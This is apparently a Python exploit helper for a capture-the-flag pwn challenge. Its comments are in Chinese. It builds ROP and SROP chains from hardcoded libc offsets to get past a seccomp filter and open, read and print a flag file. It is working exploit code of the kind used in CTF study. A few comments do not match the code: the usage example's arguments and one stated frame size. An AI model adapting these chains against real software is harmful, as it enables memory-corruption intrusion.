#!/usr/bin/env python3
"""
Pwn/arbitragedb — ORW chain 建構器（libc offset 已從題目附的 libc.so.6 靜態抽出）

關鍵約束（靜態掃描確認）：
  * seccomp 只允許 read/write/close/fstat/lseek/brk/rt_sigreturn/exit/exit_group/
    openat/newfstatat  → 沒有 execve/mmap/mprotect，只能 ORW
  * **libc 裡沒有任何 `pop rdx` gadget**（已全面掃過 .text）
    → read/write 的第三個參數（長度）設不了
    → 所以 **主線走 SROP**（rt_sigreturn 有被 seccomp 允許），
       一個 sigframe 就把所有暫存器一次設好，不需要 pop rdx

用法：
    from rop import Rop
    r = Rop(libc_base)
    payload = r.srop_orw("/home/arbitragedb/flag")
"""
import struct

p64 = lambda x: struct.pack("<Q", x)

# ── 從題目附的 libc.so.6 抽出的 offset（Ubuntu GLIBC 2.43-2ubuntu2.3）──
class Off:
    syscall_ret   = 0x0a0be6   # syscall; ret
    pop_rdi       = 0x11bc7a   # pop rdi; ret
    pop_rsi       = 0x05c2e7   # pop rsi; ret
    pop_rax       = 0x0e5dc7   # pop rax; ret
    ret           = 0x0289fe   # ret（堆疊對齊用）
    mov_rdx_rax   = 0x146257   # mov rdx,rax; ret
    # 函式
    openat        = 0x127c50
    read          = 0x128310
    write         = 0x128dd0
    environ       = 0x219de8   # 拿 stack leak 用
    # FSOP / pivot（dynsym 實測值）
    IO_wfile_jumps  = 0x211228
    IO_file_jumps   = 0x211030
    IO_list_all     = 0x213480
    IO_2_1_stdout_  = 0x213580
    IO_2_1_stdin_   = 0x2128e0
    IO_wdoallocbuf  = 0x092020
    IO_wfile_overflow = 0x094110
    setcontext      = 0x04be80
    # ★ setcontext+0x3d：mov rsp,[rdx+0xa0] … push [rdx+0xa8]; ret
    #   注意是 rdx 版本（glibc 2.29+），不是舊版的 rdi
    setcontext_rdx  = 0x04bebd

AT_FDCWD = -100 & 0xffffffffffffffff

# ── rt_sigreturn frame 欄位偏移（ucontext_t 起點為 0）──
_SIG_REGS = ["r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
             "rdi", "rsi", "rbp", "rbx", "rdx", "rax", "rcx", "rsp",
             "rip", "eflags", "csgsfs", "err", "trapno", "oldmask",
             "cr2", "fpstate"]
SIGFRAME_OFF = {n: 0x28 + i * 8 for i, n in enumerate(_SIG_REGS)}
SIGFRAME_LEN = 0xe8

assert SIGFRAME_OFF["rdi"] == 0x68, "sigframe 佈局錯了"
assert SIGFRAME_OFF["rax"] == 0x90, "sigframe 佈局錯了"
assert SIGFRAME_OFF["rip"] == 0xa8, "sigframe 佈局錯了"
assert SIGFRAME_OFF["fpstate"] + 8 == SIGFRAME_LEN, "sigframe 長度錯了"


class Rop:
    def __init__(self, libc_base: int):
        self.b = libc_base
        for k, v in vars(Off).items():
            if not k.startswith("_"):
                setattr(self, k, libc_base + v if isinstance(v, int) else v)

    # ── SROP：主線。rt_sigreturn 被 seccomp 允許，可一次設好所有暫存器 ──
    def sigframe(self, rax=0, rdi=0, rsi=0, rdx=0, rip=0, rsp=0):
        """
        x86-64 rt_sigreturn frame = ucontext_t，rsp 必須指向 ucontext 起點。

        佈局（已用 SIGFRAME_OFF 自我驗證）：
          +0x00 uc_flags   +0x08 uc_link   +0x10 uc_stack(24)
          +0x28 起是 sigcontext：r8 r9 r10 r11 r12 r13 r14 r15
                rdi rsi rbp rbx rdx rax rcx rsp rip eflags csgsfs ...
          +0xe0 fpstate（必須為 0，否則 kernel 會去解析 FPU state）
        有效長度 0xe8。
        """
        regs = {"rdi": rdi, "rsi": rsi, "rdx": rdx, "rax": rax,
                "rsp": rsp, "rip": rip, "csgsfs": 0x33}
        f = bytearray(0xe8)
        for name, val in regs.items():
            o = SIGFRAME_OFF[name]
            f[o:o + 8] = p64(val)
        return bytes(f)

    # setcontext+0x3d 讀的 ucontext 跟 SROP sigframe 是同一套偏移
    # （rsp@0xa0, rip@0xa8, rdi@0x68, rsi@0x70, rdx@0x88 全部一致）
    # → 同一份結構兩邊都能用，不必寫兩套
    ucontext = sigframe

    def srop_call(self, nr, a1=0, a2=0, a3=0, next_rip=None, next_rsp=0):
        """一次 SROP：設 rax=15 → syscall → kernel 還原成 nr(a1,a2,a3)"""
        chain  = p64(self.pop_rax) + p64(15)
        chain += p64(self.syscall_ret)
        chain += self.sigframe(rax=nr, rdi=a1, rsi=a2, rdx=a3,
                               rip=next_rip if next_rip else self.syscall_ret,
                               rsp=next_rsp)
        return chain

    # ── 純 ROP 版本（備案；受限於沒有 pop rdx，長度只能靠 mov rdx,rax）──
    def rop_orw(self, path_addr: int, buf_addr: int, nbytes: int = 0x100):
        """
        openat(AT_FDCWD, path, 0, 0) → read(fd, buf, n) → write(1, buf, n)
        注意：沒有 pop rdx，這裡用 pop rax + mov rdx,rax 來設長度。
        openat 的 fd 回傳在 rax，要接到 read 的 rdi 需要 mov rdi,rax gadget，
        實務上較脆弱 → **建議用 srop_orw()**。
        """
        c  = p64(self.pop_rdi) + p64(AT_FDCWD)
        c += p64(self.pop_rsi) + p64(path_addr)
        c += p64(self.pop_rax) + p64(0)
        c += p64(self.mov_rdx_rax)          # rdx = 0 (flags)
        c += p64(self.openat)
        # ── 這裡需要 mov rdi,rax；若找不到就改走 SROP ──
        c += p64(self.pop_rsi) + p64(buf_addr)
        c += p64(self.pop_rax) + p64(nbytes)
        c += p64(self.mov_rdx_rax)
        c += p64(self.read)
        c += p64(self.pop_rdi) + p64(1)
        c += p64(self.pop_rsi) + p64(buf_addr)
        c += p64(self.pop_rax) + p64(nbytes)
        c += p64(self.mov_rdx_rax)
        c += p64(self.write)
        return c

    def srop_orw(self, path_addr: int, buf_addr: int,
                 frame_base: int, nbytes: int = 0x100, fd: int = 3):
        """
        ★ 主線：三個 SROP 串起來做 ORW。
        path_addr  : "/home/arbitragedb/flag\0" 在記憶體裡的位址
        buf_addr   : 讀進來要放哪
        frame_base : 這整條 chain 被放在哪（用來算下一個 frame 的 rsp）
        fd         : openat 之後預期拿到的 fd（通常是 3；stdin/out/err 佔 0-2）

        每個 SROP frame 長度 = 2*8 (pop rax;15) + 8 (syscall) + 0x100 (sigframe)
        """
        SZ = 8 * 3 + SIGFRAME_LEN
        f1 = frame_base
        f2 = f1 + SZ
        f3 = f2 + SZ

        c  = self.srop_call(257, AT_FDCWD, path_addr, 0,          # openat
                            next_rip=self.syscall_ret, next_rsp=f2)
        c += self.srop_call(0,   fd,       buf_addr,  nbytes,     # read
                            next_rip=self.syscall_ret, next_rsp=f3)
        c += self.srop_call(1,   1,        buf_addr,  nbytes)     # write(1,...)
        return c


if __name__ == "__main__":
    r = Rop(0x7ffff7c00000)   # 假的 base，只為檢查長度/結構
    frame = 0xdeadb000
    pl = r.srop_orw(path_addr=frame + 0x900, buf_addr=frame + 0x980, frame_base=frame)
    print(f"[*] SROP ORW chain length = {len(pl)} (0x{len(pl):x}) bytes")
    print(f"[*] 單個 SROP frame = 0x{8*3+SIGFRAME_LEN:x} bytes")
    print(f"[*] 注意：chain 約 0x{len(pl):x}，而 heap overflow 可寫約 0x1fe8 → 放得下")
    assert len(r.sigframe()) == SIGFRAME_LEN
    print(f"[*] sigframe 長度自檢通過 = 0x{len(r.sigframe()):x} (= SIGFRAME_LEN)")
